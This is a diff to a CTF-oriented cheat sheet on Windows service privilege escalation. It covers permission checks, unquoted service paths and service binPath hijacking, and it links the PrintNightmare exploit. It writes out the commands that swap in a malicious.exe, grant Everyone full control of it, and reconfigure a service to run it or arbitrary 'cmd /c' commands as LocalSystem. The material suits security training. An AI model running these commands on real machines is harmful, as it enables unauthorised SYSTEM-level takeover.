@@ -1,7 +1,7 @@
 # Windows services
 
+[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
 [![windowsprivesc20](../../../../_badges/thmp/windowsprivesc20.svg)](https://tryhackme.com/room/windowsprivesc20)
-[![steelmountain](../../../../_badges/thmp-p/steelmountain.svg)](https://tryhackme.com/room/steelmountain)
 
 <div class="row row-cols-lg-2"><div>
 
@@ -28,7 +28,15 @@ SERVICE_NAME: xxx
 ```
 </div><div>
 
-🔥 In CTFs, you may be able to start/stop the service manually
+* 🔑 To view the permissions of the user on a service
+
+```shell!
+PS> .\PsService.exe security service_name
+PS> sc.exe sdshow service_name
+PS> accesschk.exe ./xxx.exe -v
+```
+
+🔥 In CTFs, you may be able to start/stop the service manually, while you may also do that if you are a [server operator](privs.md#server-operators).
 
 ```shell!
 PS> sc.exe stop xxx
@@ -36,13 +44,7 @@ PS> # do your job
 PS> sc.exe start xxx
 ```
 
-🍀 Notable services: `vss`, `Spooler`, `wuauserv`, etc.
-
-➡️ See also: [Potatoes](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) 🥔 and [SweetPotato](https://github.com/CCob/SweetPotato) (1.2k ⭐).
-
-➡️ [PrintNightmare](https://github.com/cube0x0/CVE-2021-1675) (CVE-2021-1675) vulnerability in Spooler service.
-
-➡️ Users in group `Server Operators` can start/stop some services. They can also [edit](#insecure-service-permissions) some services, such as to replace the binary path.
+🍀 Notable services: `vss`, `dns`, `Spooler`, `wuauserv`, `AppReadiness`, etc.
 </div></div>
 
 <hr class="sep-both">
@@ -60,9 +62,12 @@ PS> icacls C:\[...]\service.exe
 PS> move C:\[...]\service.exe C:\[...]\service.exe.old
 PS> icacls C:\[...]\malicious.exe /grant Everyone:F
 ```
-</div><div>
+
+<br>
 
 #### Unquoted Service Path
+
+[![steelmountain](../../../../_badges/thmp-p/steelmountain.svg)](https://tryhackme.com/room/steelmountain)
 
 If the service is using a PATH in which there are spaces, the service isn't quoted, and the hacker can create files, then the hacker may create an executable that is executed with the rest of the path in argument.
 
@@ -72,9 +77,11 @@ PS> move C:\[...]\malicious.exe $Env:appdata\Vulnerable.exe
 PS> # the service will execute
 PS> # $Env:appdata\Vulnerable.exe Program\service.exe
 ```
+</div><div>
 
 #### Insecure Service Permissions
 
+[![windows_privilege_escalation](../../../../_badges/htb/windows_privilege_escalation.svg)](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
 [![return](../../../../_badges/htb-p/return.svg)](https://app.hackthebox.com/machines/Return)
 
 It occurs if we can edit the permissions of a service, such as being able to change the location of the binary. Use the [accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) command. If the user is granted `SERVICE_ALL_ACCESS` on the service, then have fun.
@@ -83,6 +90,20 @@ It occurs if we can edit the permissions of a service, such as being able to cha
 PS> # LocalSystem is the highest privileged account available
 PS> sc.exe config xxx binPath=C:\[...]\malicious.exe  obj= LocalSystem
 ```
+
+A common approach to execute a command is to use:
+
+```ps
+PS> sc.exe config XXX binPath= "cmd /c <some command here>"
+PS> sc.exe config XXX binPath= "C:\windows\system32\cmd.exe /c <some command here>"
+PS> sc.exe start XXX # fails but executed the command
+```
+
+<br>
+
+#### Well-Known CVEs
+
+* [PrintNightmare](https://github.com/cube0x0/CVE-2021-1675) (CVE-2021-1675) vulnerability in Spooler service.
 </div></div>
 
 <hr class="sep-both">
